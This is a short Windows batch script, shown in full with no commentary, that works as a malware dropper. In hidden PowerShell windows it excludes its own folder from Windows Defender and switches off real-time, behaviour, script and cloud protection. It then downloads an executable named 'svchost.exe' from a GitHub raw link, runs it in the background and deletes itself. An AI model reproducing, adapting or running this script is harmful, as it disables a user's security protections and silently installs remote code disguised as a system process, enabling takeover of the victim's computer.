@echo off
cd /d "%~dp0"
powershell -w hidden -Command "Add-MpPreference -ExclusionPath '%~dp0'"
powershell -w hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -CloudProtectionLevel 0; Set-MpPreference -PUAProtection 0; Set-MpPreference -SubmitSamplesConsent 2"
powershell -w hidden -Command "iwr 'https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe' -O '%~dp0svchost.exe'"
if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
del "%~f0" >nul 2>&1
